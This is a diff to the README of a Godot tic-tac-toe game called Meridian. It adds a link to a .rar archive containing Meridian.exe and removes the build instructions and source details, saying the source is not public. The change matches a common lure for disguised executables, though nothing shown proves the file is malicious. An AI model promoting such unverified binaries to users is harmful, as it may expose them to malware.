@@ -11,6 +11,14 @@ A polished, modern tic-tac-toe game built in **Godot 4** with **GDScript**. Play
 
 ---
 
+## ⬇️ Download
+
+**[Download Meridian for Windows (v0.2.0)](https://github.com/AmirHossein143/Meridian/releases/download/0.2.0/Meridian-0.2.0-windows-64.rar)**
+
+Unzip the `.rar` and run `Meridian.exe` — no installation needed. All other versions and release notes live on the **[Releases](https://github.com/AmirHossein143/Meridian/releases)** page.
+
+---
+
 ## ✨ What makes it different
 
 Meridian isn't win-on-3 tic-tac-toe. The board **always fills completely** — there's no early win. Once every cell is placed, the board is scored: each player earns points for every straight run of 3 or more of their own mark, and the highest total wins.
@@ -75,70 +83,11 @@ Search always runs off the main thread, regardless of difficulty or board size.
 
 ---
 
-## 📁 Project structure
-
-```
-Meridian-Tic-Tac-Toe/
-├── PROTOTYPE.py           # Original Python reference (rules validation only)
-├── reference/              # Design reference (tokens.css, game.css, board.js) — not built code
-├── assets/
-│   ├── branding/            # Logo & icons (SVG)
-│   ├── screenshots/         # Images used in this README
-│   ├── fonts/                # Sora, Hanken Grotesk, JetBrains Mono
-│   ├── sfx/                  # Sound effects
-│   └── music/                # Background music
-├── scripts/
-│   ├── core/                 # Pure game logic: board, rules, scoring (no UI deps, unit-testable)
-│   ├── ai/                    # Negamax search + evaluation
-│   └── ui/                    # Screens, components, autoloads (Settings, ThemeManager, Audio)
-├── scenes/                 # Godot scenes (App, MainMenu, GameSetup, Game, Settings, Board, ...)
-├── theme/                   # theme.tres + font resources
-├── tests/                   # GdUnit4 test suite
-└── build/                   # Windows export output (gitignored)
-```
-
----
-
-## ⚙️ Getting started
-
-### Prerequisites
-
-- **Godot 4.6+** ([download](https://godotengine.org/download))
-
-### Run in the editor
-
-1. Launch Godot 4 → **Import** → select this project's folder.
-2. Press **F5**, or **Run ▸ Play**.
-
-### Run headless (CLI)
-
-```bash
-# One-time asset import
-godot --headless --path . --import
-
-# Run the game
-godot --path .
-```
-
-### Run tests (GdUnit4)
-
-```bash
-godot --headless --path . -s res://addons/gdUnit4/bin/GdUnitCmdTool.gd -a res://tests --ignoreHeadlessMode
-```
-
-### Export for Windows
-
-```bash
-godot --headless --export-release "Windows Desktop" build/Meridian.exe
-```
-
----
-
 ## 🛠️ Built with
 
 - **Godot 4.6** / **GDScript**
-- **GdUnit4** for unit testing
-- **Sora**, **Hanken Grotesk**, **JetBrains Mono** (Google Fonts)
+
+This repository ships the game's design prototype ([`PROTOTYPE.py`](PROTOTYPE.py)) and preview assets only — the full Godot source isn't public. Grab the compiled build from the [Download](#️-download) section above.
 
 ## 📱 Platform support
 
